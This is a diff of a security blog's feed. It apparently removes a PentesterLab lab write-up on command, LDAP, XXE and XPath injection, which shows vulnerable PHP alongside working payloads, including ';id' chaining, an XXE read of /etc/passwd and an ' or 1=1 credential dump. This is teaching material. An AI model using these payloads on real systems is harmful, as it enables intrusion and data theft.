+</span><span class='line'>WoW! If you are viewing this, You have <span class="s2">&quot;Sucessfully!!&quot;</span> completed SickOs1.2, the challenge is more focused on elimination of tool in real scenarios where tools can be blocked during an assesment and thereby fooling tester<span class="o">(</span>s<span class="o">)</span>, gathering more information about the target using different methods, though <span class="k">while</span> developing many of the tools were limited/completely blocked, to get a feel of Old School and testing it manually.
+</span><span class='line'>
+</span><span class='line'>Thanks <span class="k">for</span> giving this try.
+</span><span class='line'>
+</span><span class='line'>@vulnhub: Thanks <span class="k">for</span> hosting this UP!.
+</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<!--- Reference -->
+
+
+
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[[VulnHub] Kevgir: 1]]></title>
@@ -12724,281 +13267,6 @@ Then it introduces the basics of post exploitation: shell, reverse-shell and TCP
 <p><img class="left" src="http://f4l13n5n0w.github.io/downloads/kioptrix2014/3.png"></p>
 
 <p><img class="left" src="http://f4l13n5n0w.github.io/downloads/kioptrix2014/4.png"></p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[[PentesterLab] Web for Pentester - FINAL]]></title>
-    <link href="http://f4l13n5n0w.github.io/blog/2015/05/23/pentesterlab-web-for-pentester-final/"/>
-    <updated>2015-05-23T00:52:14-04:00</updated>
-    <id>http://f4l13n5n0w.github.io/blog/2015/05/23/pentesterlab-web-for-pentester-final</id>
-    <content type="html"><![CDATA[<p>&ldquo;This course details all you need to know to start doing web penetration testing. PentesterLab tried to put together the basics of web testing and a summary of the most common vulnerabilities with the LiveCD to test them.&rdquo; &ndash; PentesterLab</p>
-
-<p>Due to this is quite a long course, I have to divide the course into several parts and this is the last one will focus on several different types of injection: Commands injection, LDAP injection and XML injection. More information and ISO download please check <a href="https://www.pentesterlab.com/exercises/web_for_pentester/">here</a>. The official <a href="https://www.pentesterlab.com/exercises/web_for_pentester/course">course</a> is highly recommanded to read.</p>
-
-<p>Difficulty: 1 / 5</p>
-
-<!-- more -->
-
-
-<h1>Commands Injection</h1>
-
-<blockquote><p>Command injection is an attack in which the goal is execution of arbitrary commands on the host operating system via a vulnerable application. Command injection attacks are possible when an application passes unsafe user supplied data (forms, cookies, HTTP headers etc.) to a system shell. In this attack, the attacker-supplied operating system commands are usually executed with the privileges of the vulnerable application. Command injection attacks are possible largely due to insufficient input validation.</p><footer><strong>OWASP</strong> <cite><a href='https://www.owasp.org/index.php/Command_Injection'>Command Injection</a></cite></footer></blockquote>
-
-
-<h2>Example 1</h2>
-
-<p>Code review:</p>
-
-<figure class='code'><figcaption><span>example1.php </span></figcaption>
-<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span> <span class="k">require_once</span><span class="p">(</span><span class="s2">&quot;../header.php&quot;</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x"></span>
-</span><span class='line'><span class="x">&lt;pre&gt;</span>
-</span><span class='line'><span class="cp">&lt;?php</span>
-</span><span class='line'>  <span class="nb">system</span><span class="p">(</span><span class="s2">&quot;ping -c 2 &quot;</span><span class="o">.</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;ip&#39;</span><span class="p">]);</span>
-</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
-</span><span class='line'><span class="x">&lt;/pre&gt;</span>
-</span><span class='line'><span class="cp">&lt;?php</span> <span class="k">require_once</span><span class="p">(</span><span class="s2">&quot;../footer.php&quot;</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x"></span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>This one is simple and directly exploitable.</p>
-
-<p>From the page we know the command ping $ip is running on server side and return the result to the client. Due to there is no input validation, we can inject payload to construct multi commands in one line with &ldquo;;&rdquo;, &ldquo;|&rdquo; or &ldquo;&amp;&amp;&rdquo;, for example, &ldquo;ping 127.0.0.1; id&rdquo; or &ldquo;ping 127.0.0.1 &amp;&amp; id&rdquo;.</p>
-
-<p>PoC:</p>
-
-<p><code>http://10.10.10.129/commandexec/example1.php?ip=127.0.0.1 %26%26 id</code></p>
-
-<p><code>http://10.10.10.129/commandexec/example1.php?ip=127.0.0.1; id</code></p>
-
-<p><code>http://10.10.10.129/commandexec/example1.php?ip=127.0.0.1| id</code></p>
-
-<h2>Example 2</h2>
-
-<p>Code review:</p>
-
-<figure class='code'><figcaption><span>example2.php </span></figcaption>
-<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span> <span class="k">require_once</span><span class="p">(</span><span class="s2">&quot;../header.php&quot;</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x"></span>
-</span><span class='line'><span class="x">&lt;pre&gt;</span>
-</span><span class='line'><span class="cp">&lt;?php</span>
-</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">&#39;/^\d{1,3}\.\d{1,3}\.\d{1,3}.\d{1,3}$/m&#39;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;ip&#39;</span><span class="p">])))</span> <span class="p">{</span>
-</span><span class='line'>     <span class="k">die</span><span class="p">(</span><span class="s2">&quot;Invalid IP address&quot;</span><span class="p">);</span>
-</span><span class='line'>  <span class="p">}</span>
-</span><span class='line'>  <span class="nb">system</span><span class="p">(</span><span class="s2">&quot;ping -c 2 &quot;</span><span class="o">.</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;ip&#39;</span><span class="p">]);</span>
-</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
-</span><span class='line'><span class="x">&lt;/pre&gt;</span>
-</span><span class='line'><span class="cp">&lt;?php</span> <span class="k">require_once</span><span class="p">(</span><span class="s2">&quot;../footer.php&quot;</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x"></span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>From the source code above, we can see that <a href="http://php.net/manual/en/reference.pcre.pattern.modifiers.php">PRCE Modifier &ldquo;m&rdquo;</a> is used in preg_match function. As a result, we can bypass this validation by using newline &ldquo;<em><font color="red">%0a</font></em>&rdquo;.</p>
-
-<p>PoC:</p>
-
-<p><code>http://10.10.10.129/commandexec/example2.php?ip=127.0.0.1%0aid</code></p>
-
-<h2>Example 3</h2>
-
-<p>Code review:</p>
-
-<figure class='code'><figcaption><span>example3.php </span></figcaption>
-<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span> <span class="k">require_once</span><span class="p">(</span><span class="s2">&quot;../header.php&quot;</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x"></span>
-</span><span class='line'><span class="x">&lt;pre&gt;</span>
-</span><span class='line'><span class="cp">&lt;?php</span>
-</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">&#39;/^\d{1,3}\.\d{1,3}\.\d{1,3}.\d{1,3}$/&#39;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;ip&#39;</span><span class="p">])))</span> <span class="p">{</span>
-</span><span class='line'>     <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Location: example3.php?ip=127.0.0.1&quot;</span><span class="p">);</span>
-</span><span class='line'>  <span class="p">}</span>
-</span><span class='line'>  <span class="nb">system</span><span class="p">(</span><span class="s2">&quot;ping -c 2 &quot;</span><span class="o">.</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;ip&#39;</span><span class="p">]);</span>
-</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
-</span><span class='line'><span class="x">&lt;/pre&gt;</span>
-</span><span class='line'><span class="cp">&lt;?php</span> <span class="k">require_once</span><span class="p">(</span><span class="s2">&quot;../footer.php&quot;</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x"></span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>This time the <em>preg_match</em> function did a good validation on user&rsquo;s input. However, the script didn&rsquo;t stop when evil character is matched in user&rsquo;s input. Instead of, it only use header function to do a redirection without die function to stop the script.</p>
-
-<p>So the attacking methods (&lsquo;;&rsquo;, &lsquo;&amp;&amp;&rsquo; and &lsquo;|&rsquo;) still works on this one, but it will need a proxy like <strong><em>burpsuite</em></strong> or <strong><em>nc/telnet</em></strong> to read the first response page.</p>
-
-<p>PoC:</p>
-
-<p>Use <strong><em>NC</em></strong> to exploit this vulnerability</p>
-
-<p><code>echo -e "GET /commandexec/example3.php?ip=127.0.0.1;id HTTP/1.1\r\nHost: 10.10.10.129\r\nConnection: close\r\n" | nc 10.10.10.129 80</code></p>
-
-<p><code>echo -e "GET /commandexec/example3.php?ip=127.0.0.1|id HTTP/1.1\r\nHost: 10.10.10.129\r\nConnection: close\r\n" | nc 10.10.10.129 80</code></p>
-
-<p><code>echo -e "GET /commandexec/example3.php?ip=127.0.0.1%26%26id HTTP/1.1\r\nHost: 10.10.10.129\r\nConnection: close\r\n" | nc 10.10.10.129 80</code></p>
-
-<h1>LDAP Injection</h1>
-
-<blockquote><p>LDAP Injection is an attack used to exploit web based applications that construct LDAP statements based on user input. When an application fails to properly sanitize user input, it’s possible to modify LDAP statements using a local proxy. This could result in the execution of arbitrary commands such as granting permissions to unauthorized queries, and content modification inside the LDAP tree. The same advanced exploitation techniques available in SQL Injection can be similarly applied in LDAP Injection.</p><footer><strong>https://www.owasp.org/index.php/LDAP_injection LDAP Injection</strong></footer></blockquote>
-
-
-<h2>Example 1</h2>
-
-<p>Code review:</p>
-
-<figure class='code'><figcaption><span>example1.php </span></figcaption>
-<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
-</span><span class='line'>  <span class="o">...</span> <span class="o">...</span>
-</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="nv">$ld</span><span class="p">)</span> <span class="p">{</span>
-</span><span class='line'>   <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;username&quot;</span><span class="p">]))</span> <span class="p">{</span>
-</span><span class='line'>     <span class="nv">$user</span> <span class="o">=</span> <span class="s2">&quot;uid=&quot;</span><span class="o">.</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;username&quot;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;ou=people,dc=pentesterlab,dc=com&quot;</span><span class="p">;</span>
-</span><span class='line'>   <span class="p">}</span>
-</span><span class='line'>   <span class="nv">$lb</span> <span class="o">=</span> <span class="o">@</span><span class="nb">ldap_bind</span><span class="p">(</span><span class="nv">$ld</span><span class="p">,</span> <span class="nv">$user</span><span class="p">,</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;password&quot;</span><span class="p">]);</span>
-</span><span class='line'>   <span class="o">...</span> <span class="o">...</span>
-</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Due to the developer use ldap_bind function which will make an anonymous bind if both parameters are not specified, the attacker can bypass the authentication by removing all the parameters from the query.</p>
-
-<p>PoC:</p>
-
-<p><code>http://10.10.10.129/ldap/example1.php</code></p>
-
-<h2>Example 2</h2>
-
-<p>Code review:</p>
-
-<figure class='code'><figcaption><span>example2.php </span></figcaption>
-<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
-</span><span class='line'>      <span class="o">...</span> <span class="o">...</span>
-</span><span class='line'>  <span class="nv">$pass</span> <span class="o">=</span> <span class="s2">&quot;{MD5}&quot;</span><span class="o">.</span><span class="nb">base64_encode</span><span class="p">(</span><span class="nb">pack</span><span class="p">(</span><span class="s2">&quot;H*&quot;</span><span class="p">,</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">])));</span>
-</span><span class='line'>  <span class="nv">$filter</span> <span class="o">=</span> <span class="s2">&quot;(&amp;(cn=&quot;</span><span class="o">.</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;)(userPassword=&quot;</span><span class="o">.</span><span class="nv">$pass</span><span class="o">.</span><span class="s2">&quot;))&quot;</span><span class="p">;</span>
-</span><span class='line'>      <span class="o">...</span> <span class="o">...</span>
-</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>After checking the source code, the attacker can bypass the authentication by using the following exploit payload:</p>
-
-<p><code>http://10.10.10.129/ldap/example2.php?name=hacker)(cn=*))%00&amp;password=asdfasdf</code></p>
-
-<p>the variable <em>$filter</em> will become to &ldquo;<font color="red">(&amp;(cn=hacker)(cn=*))%00)(userPassword=[pass]))</font>&rdquo; which <strong><em>%00</em></strong> will get rid of all the following strings.</p>
-
-<p>More information about testing LDAP injection, please check the OWASP article <a href="https://www.owasp.org/index.php/Testing_for_LDAP_Injection_(OTG-INPVAL-007)">Testing for LDAP Injection</a></p>
-
-<h1>XML Injection</h1>
-
-<h2>Example 1</h2>
-
-<p>Code review:</p>
-
-<figure class='code'><figcaption><span>example1.php </span></figcaption>
-<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span> <span class="k">require_once</span><span class="p">(</span><span class="s2">&quot;../header.php&quot;</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x"></span>
-</span><span class='line'><span class="x">Hello  </span>
-</span><span class='line'><span class="cp">&lt;?php</span>
-</span><span class='line'>  <span class="nv">$xml</span><span class="o">=</span><span class="nb">simplexml_load_string</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;xml&#39;</span><span class="p">]);</span>
-</span><span class='line'>  <span class="nb">print_r</span><span class="p">((</span><span class="nx">string</span><span class="p">)</span><span class="nv">$xml</span><span class="p">);</span>
-</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
-</span><span class='line'><span class="cp">&lt;?php</span> <span class="k">require_once</span><span class="p">(</span><span class="s2">&quot;../footer.php&quot;</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x"></span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>XML eXternal Entity (XXE) attack:</p>
-
-<blockquote><p>External Entity: The set of valid entities can be extended by defining new entities. If the definition of an entity is a URI, the entity is called an external entity. Unless configured to do otherwise, external entities force the XML parser to access the resource specified by the URI, e.g., a file on the local machine or on a remote systems. This behavior exposes the application to XML eXternal Entity (XXE) attacks, which can be used to perform denial of service of the local system, gain unauthorized access to files on the local machine, scan remote machines, and perform denial of service of remote systems.</p><footer><strong>OWASP</strong> <cite><a href='https://www.owasp.org/index.php/Testing_for_XML_Injection_(OTG-INPVAL-008)'>Testing_for_XML_Injection</a></cite></footer></blockquote>
-
-
-<p>Attacking payload (read system file: /etc/passwd):</p>
-
-<p><code>&lt;!DOCTYPE test [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;&lt;test&gt;&amp;xxe;&lt;/test&gt;</code></p>
-
-<p>PoC (with URL encoded):</p>
-
-<p><code>http://10.10.10.129/xml/example1.php?xml=%3C%21DOCTYPE%20test%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22file%3A%2f%2f%2fetc%2fpasswd%22%3E%5D%3E%3Ctest%3E%26xxe%3B%3C%2ftest%3E</code></p>
-
-<h2>Example 2</h2>
-
-<p>Code review:</p>
-
-<figure class='code'><figcaption><span>example2.php </span></figcaption>
-<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span> <span class="k">require_once</span><span class="p">(</span><span class="s2">&quot;../header.php&quot;</span><span class="p">);</span>
-</span><span class='line'>
-</span><span class='line'>  <span class="nv">$x</span> <span class="o">=</span> <span class="s2">&quot;&lt;data&gt;&lt;users&gt;&lt;user&gt;&lt;name&gt;hacker&lt;/name&gt;&lt;message&gt;Hello hacker&lt;/message&gt;&lt;password&gt;pentesterlab&lt;/password&gt;&lt;/user&gt;&lt;user&gt;&lt;name&gt;admin&lt;/name&gt;&lt;message&gt;Hello admin&lt;/message&gt;&lt;password&gt;s3cr3tP4ssw0rd&lt;/password&gt;&lt;/user&gt;&lt;/users&gt;&lt;/data&gt;&quot;</span><span class="p">;</span>
-</span><span class='line'>
-</span><span class='line'>  <span class="nv">$xml</span><span class="o">=</span><span class="nb">simplexml_load_string</span><span class="p">(</span><span class="nv">$x</span><span class="p">);</span>
-</span><span class='line'>  <span class="nv">$xpath</span> <span class="o">=</span> <span class="s2">&quot;users/user/name[.=&#39;&quot;</span><span class="o">.</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&#39;]/parent::*/message&quot;</span><span class="p">;</span>
-</span><span class='line'>  <span class="nv">$res</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$xml</span><span class="o">-&gt;</span><span class="na">xpath</span><span class="p">(</span><span class="nv">$xpath</span><span class="p">));</span>
-</span><span class='line'>  <span class="k">while</span><span class="p">(</span><span class="k">list</span><span class="p">(</span> <span class="p">,</span><span class="nv">$node</span><span class="p">)</span> <span class="o">=</span> <span class="nb">each</span><span class="p">(</span><span class="nv">$res</span><span class="p">))</span> <span class="p">{</span>
-</span><span class='line'>      <span class="k">echo</span> <span class="nv">$node</span><span class="p">;</span>
-</span><span class='line'>  <span class="p">}</span>
-</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>From the source code above, we know that variable $_GET[&lsquo;name&rsquo;] has no input validation and can be used to inject evil code.</p>
-
-<p>In order to dump all the users' credentials, I use the payload &ldquo;<font color="red">&lsquo; or 1=1]%00</font>&rdquo; to construct the variable $xpath as follows:</p>
-
-<p><code>users/user/name[.='' or 1=1]%00']/parent::*/message</code></p>
-
-<p>Here <strong><em>%00</em></strong> will get rid of the following strings.</p>
-
-<p>PoC:</p>
-
-<p><code>http://10.10.10.129/xml/example2.php?name=' or 1=1]%00</code></p>
 ]]></content>
   </entry>
   
